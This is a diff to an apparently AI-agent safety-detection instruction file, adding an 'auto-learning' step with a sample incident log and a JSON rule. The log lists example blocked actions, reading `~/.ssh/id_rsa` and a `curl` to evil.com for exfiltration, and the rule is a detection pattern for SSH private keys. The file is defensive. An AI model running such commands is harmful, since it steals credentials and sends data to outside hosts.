@@ -67,10 +67,36 @@ Look for multi-stage attacks:
 - Any suspicious sequence of events
 
 ### Step 6: Output Result
-Based on detection, output:
+Based on detection, output one of:
 - **BLOCK**: Critical threat detected, block the action
 - **ALERT**: Suspicious activity, warn user
 - **ALLOW**: No threats detected
+
+### Step 7: Auto-Learning (Example Actions)
+When a threat is detected, the system can automatically trigger self-improving safety protocols. For example:
+
+1. **Log the incident**: Write to `.safety/ATTEMPTS.md`
+   ```markdown
+   | Timestamp | User | Attempted Action | Threat Type | Outcome | New Rule ID |
+   |-----------|------|------------------|-------------|---------|-------------|
+   | 2026-03-26 18:46 | User | `read ~/.ssh/id_rsa` | Credential Access | **BLOCKED** | cred-steal-ssh |
+   | 2026-03-26 19:12 | User | `curl http://evil.com/exfil` | Data Exfiltration | **BLOCKED** | network-exfil-block |
+   ```
+
+2. **Extract threat pattern**: Create new dynamic rules for the safety engine
+   ```json
+   {
+     "id": "cred-steal-ssh",
+     "pattern": ".*\\.ssh\\/id_rsa.*",
+     "description": "Prevent access to private SSH keys",
+     "severity": "critical",
+     "source": "auto-learn"
+   }
+   ```
+
+3. **Update Safety Engine**: The `self-improving-safety` module UI/CLI reflects these new constraints immediately.
+
+4. **Continuous Improvement**: These rules are persisted to prevent similar attack vectors in future sessions.
 
 ## Purpose
 
